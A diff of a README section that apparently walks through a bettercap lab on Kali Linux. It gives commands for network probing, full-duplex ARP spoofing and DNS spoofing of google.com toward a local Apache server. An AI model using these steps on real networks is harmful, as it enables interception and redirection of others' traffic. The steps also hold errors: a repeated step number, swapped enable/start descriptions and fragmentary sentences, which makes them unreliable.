@@ -62,45 +62,45 @@ This README walks through the steps to set up **bettercap** on Kali Linux and pe
      sudo bettercap
      ```
 
-10. **Enable network probing**
+10.  **Enable network probing**
    - Inside the bettercap interactive prompt, enable net probing:
-     ```
+     ```bash
      net.probe on
      ```
 
 11. **Show discovered hosts**
     - To list detected hosts and endpoints:
-      ```
+      ```bash
       net.show
       ```
 
 12. **Enable ARP spoofing (full duplex)**
     - Configure ARP spoofing for full-duplex (attacks both target and gateway) and start:
-      ```
+      ```bash
       set arp.spoof.fullduplex true
       arp.spoof on
       ```
 13. **Enable Apache2 server**
     - Make a benign web service available in the lab so that any redirected DNS traffic:
-      ```
+      ```bash
       sudo systemctl enable apache2
 
       ```
 14. **Enable the web service to start at system boot**
     - Ensures the lab web service remains available across reboots:
-      ```
+      ```bash
       sudo systemctl start apache2
 
       ```
 15. **Designate the target host for network observation**
     - machine’s traffic and name-resolution behavior:
-      ```
+      ```bash
       Set arp.spoof.target IP address of the system you want to target
 
       ```
 14. **Configure DNS response behavior**
     - Mapping of domain names to IP addresses:
-      ```
+      ```bash
       set dns.spoof.domain google.com
       set dns.spoof.address ip address
       set dns.spoof.all true
